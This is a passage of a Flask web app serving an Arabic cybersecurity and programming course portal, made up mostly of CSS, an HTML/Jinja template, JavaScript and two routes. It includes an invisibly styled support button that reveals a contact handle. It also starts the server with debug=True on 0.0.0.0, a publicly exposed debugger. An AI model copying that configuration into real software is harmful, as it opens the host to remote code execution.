            letter-spacing: 3px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 10px;
            margin-bottom: 15px;
        }
        .sidebar-category {
            margin-bottom: 15px;
        }
        .sidebar-category h4 {
            color: #ff00ff;
            font-size: 0.8rem;
            letter-spacing: 2px;
            margin-bottom: 5px;
        }
        .sidebar-category ul {
            list-style: none;
        }
        .sidebar-category li {
            padding: 5px 10px;
            margin: 2px 0;
            color: #aaa;
            font-size: 0.75rem;
            border-left: 2px solid transparent;
            cursor: pointer;
            transition: 0.3s;
            border-radius: 4px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .sidebar-category li:hover {
            color: #00ff41;
            border-left-color: #00ff41;
            background: rgba(0,255,65,0.05);
        }
        .sidebar-category li.active {
            color: #00ff41;
            border-left-color: #00ff41;
            background: rgba(0,255,65,0.1);
        }
        .sidebar-category li .badge {
            font-size: 0.5rem;
            color: #444;
            padding: 1px 6px;
            border: 1px solid #1a1a1a;
            border-radius: 10px;
        }

        /* ===== MAIN CONTENT ===== */
        .main-content {
            background: rgba(0,0,0,0.9);
            border: 1px solid #1a1a1a;
            border-radius: 12px;
            padding: 30px;
        }
        .lesson-title {
            font-size: 2rem;
            color: #00ff41;
            text-shadow: 0 0 30px #00ff41;
            margin-bottom: 5px;
        }
        .lesson-meta {
            color: #888;
            font-size: 0.85rem;
            margin-bottom: 20px;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .lesson-meta span {
            border: 1px solid #1a1a1a;
            padding: 3px 12px;
            border-radius: 12px;
        }
        .lesson-description {
            color: #ccc;
            line-height: 1.8;
            font-size: 1rem;
            margin: 15px 0;
            padding: 15px;
            background: rgba(0,255,65,0.03);
            border-radius: 8px;
            border-right: 3px solid #00ff41;
        }
        .code-block {
            background: #0d0d0d;
            border: 1px solid #1a1a1a;
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 0.85rem;
            overflow-x: auto;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            position: relative;
        }
        .code-block .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: transparent;
            border: 1px solid #333;
            color: #666;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 0.7rem;
            cursor: pointer;
            transition: 0.3s;
        }
        .code-block .copy-btn:hover {
            border-color: #00ff41;
            color: #00ff41;
        }
        .code-block .lang-tag {
            position: absolute;
            top: 10px;
            left: 10px;
            color: #444;
            font-size: 0.6rem;
            letter-spacing: 1px;
        }

        /* ===== VIDEO PLACEHOLDER ===== */
        .video-container {
            background: #0d0d0d;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
            aspect-ratio: 16/9;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #444;
            position: relative;
        }
        .video-container .play-icon {
            font-size: 4rem;
            opacity: 0.2;
        }
        .video-container .watermark {
            position: absolute;
            bottom: 15px;
            right: 20px;
            color: #00ff41;
            font-size: 0.7rem;
            opacity: 0.2;
        }

        /* ===== FOOTER ===== */
        .footer {
            margin-top: 30px;
            padding: 20px 30px;
            border-top: 1px solid #1a1a1a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .footer-text { color: #444; font-size: 0.7rem; }
        .footer-links { display: flex; gap: 20px; flex-wrap: wrap; align-items: center; }
        .footer-links a { color: #444; font-size: 0.7rem; transition: 0.3s; }
        .footer-links a:hover { color: #00ff41; }

        /* ===== HIDDEN SUPPORT ===== */
        .hidden-support {
            color: #0a0a0a !important;
            background: #0a0a0a !important;
            border: none !important;
            cursor: pointer;
            font-size: 0.6rem;
            padding: 2px 8px;
            user-select: none;
        }
        .hidden-support:hover {
            color: #0a0a0a !important;
            background: #0a0a0a !important;
        }

        /* ===== SUPPORT MODAL ===== */
        .support-modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .support-modal.show { display: flex; }
        .support-modal-content {
            background: #0a0a0a;
            border: 2px solid #ff00ff;
            padding: 40px 50px;
            border-radius: 16px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 0 80px rgba(255,0,255,0.2);
        }
        .support-modal-content h2 {
            color: #ff00ff;
            font-size: 2rem;
            text-shadow: 0 0 30px #ff00ff;
        }
        .support-modal-content .contact {
            font-size: 1.5rem;
            color: #00ff41;
            padding: 15px;
            border: 1px solid #00ff41;
            border-radius: 8px;
            margin: 20px 0;
        }
        .support-modal-content .close-btn {
            background: transparent;
            border: 1px solid #ff3333;
            color: #ff3333;
            padding: 10px 30px;
            border-radius: 4px;
            cursor: pointer;
            font-family: inherit;
            transition: 0.3s;
        }
        .support-modal-content .close-btn:hover {
            background: #ff3333;
            color: #000;
        }

        /* ===== SEARCH ===== */
        .search-box {
            width: 100%;
            padding: 8px 12px;
            background: #0d0d0d;
            border: 1px solid #1a1a1a;
            border-radius: 6px;
            color: #00ff41;
            font-family: inherit;
            margin-bottom: 10px;
        }
        .search-box:focus {
            outline: none;
            border-color: #00ff41;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 900px) {
            .content-grid { grid-template-columns: 1fr; }
            .sidebar { position: relative; top: 0; max-height: none; }
            .brand-name { font-size: 1.2rem; }
            .lesson-title { font-size: 1.5rem; }
        }
        @media (max-width: 500px) {
            .header { padding: 10px 15px; }
            .container { padding: 10px; }
            .main-content { padding: 15px; }
            .support-modal-content { padding: 25px; }
            .footer { flex-direction: column; text-align: center; }
        }
    </style>
</head>
<body>
    <!-- HEADER -->
    <header class="header">
        <div class="header-brand">
            <span class="brand-icon">⚡</span>
            <div>
                <div class="brand-name">ABOOD_SECURE_ACADEMY</div>
                <div class="brand-sub">// 100+ LESSON // FROM ZERO TO HERO //</div>
            </div>
        </div>
        <div style="display:flex;gap:15px;align-items:center;flex-wrap:wrap;">
            <span class="header-count">📚 {{ course_list|length }} درس</span>
            <span class="header-badge">● ROOT ACCESS</span>
        </div>
    </header>

    <div class="container">
        <div class="content-grid">
            <!-- SIDEBAR -->
            <aside class="sidebar" id="sidebar">
                <div class="sidebar-title">📚 جميع الدورس ({{ course_list|length }})</div>
                <input class="search-box" id="searchBox" placeholder="🔍 ابحث عن درس..." oninput="filterCourses()">
                
                <div id="courseList">
                {% for category in ['البرمجة', 'اختبار الاختراق', 'الأدوات'] %}
                <div class="sidebar-category">
                    <h4>◈ {{ category }}</h4>
                    <ul>
                    {% for course in course_list if course.category == category %}
                        <li data-course="{{ course.id }}" onclick="loadCourse('{{ course.id }}')">
                            <span>{{ course.name }}</span>
                            <span class="badge">{{ loop.index }}</span>
                        </li>
                    {% endfor %}
                    </ul>
                </div>
                {% endfor %}
                </div>
            </aside>

            <!-- MAIN CONTENT -->
            <main class="main-content" id="mainContent">
                <h1 class="lesson-title" id="lessonTitle">مرحباً في أكاديمية عبود</h1>
                <div class="lesson-meta">
                    <span>📊 المستوى: <span id="lessonLevel">جميع المستويات</span></span>
                    <span>⏱️ المدة: <span id="lessonDuration">100+ درس</span></span>
                    <span>🏷️ القسم: شامل</span>
                </div>

                <div class="video-container">
                    <span class="play-icon">▶</span>
                    <span class="watermark">ABOOD_SECURE</span>
                </div>

                <div class="lesson-description" id="lessonDescription">
                    مرحباً بك في أكاديمية عبود للأمن السيبراني والبرمجة. اختر درساً من القائمة الجانبية للبدء.
                </div>

                <div class="code-block">
                    <span class="lang-tag">💻 Code</span>
                    <button class="copy-btn" onclick="copyCode()">نسخ</button>
                    <code id="lessonCode"># اختر درساً من القائمة الجانبية<br># لتعلم البرمجة والأمن السيبراني<br># من الصفر إلى الاحتراف</code>
                </div>

                <div style="margin-top:20px;padding:15px;background:rgba(0,255,65,0.02);border:1px solid #1a1a1a;border-radius:8px;">
                    <p style="color:#666;font-size:0.85rem;text-align:center;">
                        ⚡ 100+ درس تعليمي حقيقي في البرمجة، اختبار الاختراق، والأدوات ⚡
                    </p>
                </div>
            </main>
        </div>

        <!-- FOOTER -->
        <footer class="footer">
            <span class="footer-text">© 2026 ABOOD_SECURE_ACADEMY - 100+ درس تعليمي</span>
            <div class="footer-links">
                <a href="#">سياسة الخصوصية</a>
                <a href="#">الشروط والأحكام</a>
                <button class="hidden-support" id="supportTrigger">للاستفسارات الفورية</button>
            </div>
        </footer>
    </div>

    <!-- SUPPORT MODAL -->
    <div class="support-modal" id="supportModal">
        <div class="support-modal-content">
            <h2>🔐 دعم فوري</h2>
            <p style="color:#888;margin-bottom:15px;">للتواصل مع الدعم التقني</p>
            <div class="contact">@SSSTlF عبود</div>
            <button class="close-btn" id="closeSupport">إغلاق</button>
        </div>
    </div>

    <script>
        // ===== بيانات الدورس =====
        const coursesData = {{ courses_data|safe }};
        const courseList = {{ course_list|safe }};

        // ===== العناصر =====
        const lessonTitle = document.getElementById('lessonTitle');
        const lessonLevel = document.getElementById('lessonLevel');
        const lessonDuration = document.getElementById('lessonDuration');
        const lessonDescription = document.getElementById('lessonDescription');
        const lessonCode = document.getElementById('lessonCode');

        // ===== تحميل الدرس =====
        function loadCourse(courseId) {
            const course = coursesData[courseId];
            if (!course) return;

            lessonTitle.textContent = course.name;
            lessonLevel.textContent = course.level;
            lessonDuration.textContent = course.duration;
            lessonDescription.textContent = course.description;
            lessonCode.textContent = course.code;

            // تحديث النشاط
            document.querySelectorAll('[data-course]').forEach(el => {
                el.classList.remove('active');
                if (el.dataset.course === courseId) {
                    el.classList.add('active');
                }
            });

            // تغيير لون العنوان
            const categoryColors = {
                'البرمجة': '#00ff41',
                'اختبار الاختراق': '#ff3333',
                'الأدوات': '#ffaa00'
            };
            const category = courseList.find(c => c.id === courseId)?.category || '';
            lessonTitle.style.color = categoryColors[category] || '#00ff41';
            lessonTitle.style.textShadow = `0 0 30px ${categoryColors[category] || '#00ff41'}`;

            // تحديث الرابط
            window.history.pushState({ course: courseId }, '', `?course=${courseId}`);
        }

        // ===== نسخ الكود =====
        function copyCode() {
            const code = document.getElementById('lessonCode');
            navigator.clipboard.writeText(code.textContent).then(() => {
                const btn = document.querySelector('.copy-btn');
                btn.textContent = '✓ تم النسخ';
                setTimeout(() => btn.textContent = 'نسخ', 2000);
            });
        }

        // ===== فلترة الدورس =====
        function filterCourses() {
            const search = document.getElementById('searchBox').value.toLowerCase();
            document.querySelectorAll('[data-course]').forEach(el => {
                const name = el.querySelector('span')?.textContent?.toLowerCase() || '';
                el.style.display = name.includes(search) ? '' : 'none';
            });
        }

        // ===== زر الدعم المخفي =====
        const supportModal = document.getElementById('supportModal');
        const supportTrigger = document.getElementById('supportTrigger');
        const closeSupport = document.getElementById('closeSupport');

        supportTrigger.addEventListener('click', function(e) {
            e.preventDefault();
            supportModal.classList.add('show');
        });

        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && (e.key === 'S' || e.key === 's')) {
                e.preventDefault();
                supportModal.classList.add('show');
            }
        });

        closeSupport.addEventListener('click', function() {
            supportModal.classList.remove('show');
        });

        supportModal.addEventListener('click', function(e) {
            if (e.target === supportModal) {
                supportModal.classList.remove('show');
            }
        });

        // ===== تحميل الدرس من الـ URL =====
        const urlParams = new URLSearchParams(window.location.search);
        const courseParam = urlParams.get('course');
        if (courseParam && coursesData[courseParam]) {
            loadCourse(courseParam);
        }

        // ===== التنقل عبر Back/Forward =====
        window.addEventListener('popstate', function(event) {
            if (event.state && event.state.course) {
                loadCourse(event.state.course);
            }
        });

        // ===== Console =====
        console.log('%c◼ ABOOD_SECURE_ACADEMY ◼', 'color: #00ff41; font-size: 20px; font-weight: bold;');
        console.log(`%cمنصة تعليمية شاملة - ${courseList.length} درس تعليمي`, 'color: #888; font-size: 14px;');
        console.log('%cجميع الحقوق محفوظة © 2026', 'color: #444; font-size: 12px;');
        console.log('====================================');
        console.log(`  عدد الدورس: ${courseList.length}`);
        console.log('  المستوى: من الصفر للاحتراف');
        console.log('  الأقسام: برمجة | اختبار اختراق | أدوات');
        console.log('====================================');
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(
        HTML_TEMPLATE,
        courses_data=json.dumps(COURSES_DATA, ensure_ascii=False),
        course_list=COURSE_LIST
    )

@app.route('/api/course/<course_id>')
def get_course(course_id):
    if course_id in COURSES_DATA:
        return jsonify(COURSES_DATA[course_id])
    return jsonify({"error": "الدرس غير موجود"}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
